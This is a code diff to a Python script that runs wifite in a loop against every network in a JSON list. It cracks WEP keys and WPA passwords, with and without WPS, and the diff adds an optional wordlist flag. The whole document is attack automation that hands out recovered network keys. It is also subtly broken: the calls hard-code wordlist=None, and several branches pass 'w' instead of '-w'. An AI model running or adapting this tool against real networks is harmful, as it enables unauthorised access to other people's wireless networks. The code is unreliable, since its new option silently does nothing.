@@ -13,13 +13,13 @@ from printer import show_wpa_wps_menu
 
 CURRENT_PATH = os.getcwd()
 
-def start(database_file='networks.json', kill=False):
+def start(database_file='networks.json', kill=False, wordlist=None):
     dialog('== Iniciando ataques ==', color='p')    
 
     database = __loaddb(database_file)["array"]
     del database[0]
 
-    attack(database[:])
+    attack(database[:], kill=kill, wordlist=wordlist)
 
 
 def __loaddb(file_name):
@@ -37,7 +37,7 @@ def __loaddb(file_name):
     return db
 
 
-def attack(networks, kill=False):
+def attack(networks, kill=False, wordlist=None):
     analized_wep_networks_counter = 0
     analized_wpa_with_wps_networks_counter = 0
     analized_wpa_without_wps_networks_counter = 0
@@ -60,7 +60,7 @@ def attack(networks, kill=False):
                 
                 show_wep_menu()
 
-                hex_key =__wep_attack(net, kill=kill)[2]
+                hex_key =__wep_attack(net, kill=kill, wordlist=None)[2]
                 net["hex_key"] = hex_key
                 
                 if hex_key != '':
@@ -87,7 +87,7 @@ def attack(networks, kill=False):
                     
                     show_wpa_wps_menu()
 
-                    password = __wpa_wps_attack(net, kill=kill)[2]
+                    password = __wpa_wps_attack(net, kill=kill, wordlist=None)[2]
 
                     if password != '':
                         cracked_wpa_with_wps_networks_counter += 1
@@ -113,7 +113,7 @@ def attack(networks, kill=False):
                     
                     show_wpa_menu()
 
-                    password = __wpa_attack(net, kill=kill)[2]
+                    password = __wpa_attack(net, kill=kill, wordlist=None)[2]
 
                     if password != '':
                         cracked_wpa_without_wps_networks_counter += 1
@@ -133,9 +133,14 @@ def attack(networks, kill=False):
     dialog(f'Redes WPA sem WPS crackeadas: {cracked_wpa_without_wps_networks_counter}', color='cian')
 
 
-def __wep_attack(net, kill=False):
+def __wep_attack(net, kill=False, wordlist=None):
     if kill:
-        wifite = Popen(['wifite', '--kill', '-wep', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
+        if wordlist is not None:
+            wifite = Popen(['wifite', '-w', wordlist, '--kill', '-wep', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)    
+        else:
+            wifite = Popen(['wifite', '--kill', '-wep', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
+    elif wordlist is not None:
+        wifite = Popen(['wifite', '-w', wordlist, '-wep', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)    
     else:
         wifite = Popen(['wifite', '-wep', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
     
@@ -189,9 +194,14 @@ def __wep_attack(net, kill=False):
     '''
 
 
-def __wpa_wps_attack(net, kill=False):
+def __wpa_wps_attack(net, kill=False, wordlist=None):
     if kill:
-        wifite = Popen(['wifite', '--kill', '-wps', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
+        if wordlist is not None:
+            wifite = Popen(['wifite', 'w', wordlist, '--kill', '-wps', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
+        else:
+            wifite = Popen(['wifite', '--kill', '-wps', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
+    elif wordlist is not None:
+        wifite = Popen(['wifite', 'w', wordlist, '-wps', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
     else:
         wifite = Popen(['wifite', '-wps', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
     
@@ -220,9 +230,15 @@ def __wpa_wps_attack(net, kill=False):
     return essid, bssid, password
 
 
-def __wpa_attack(net, kill=False):
+def __wpa_attack(net, kill=False, wordlist=None):
+    
     if kill:
-        wifite = Popen(['wifite', '--kill', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
+        if wordlist is not None:
+            wifite = Popen(['wifite', 'w', wordlist,'--kill', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
+        else:
+            wifite = Popen(['wifite', '--kill', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
+    elif wordlist is not None:
+        wifite = Popen(['wifite', 'w', wordlist, '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
     else:
         wifite = Popen(['wifite', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
     
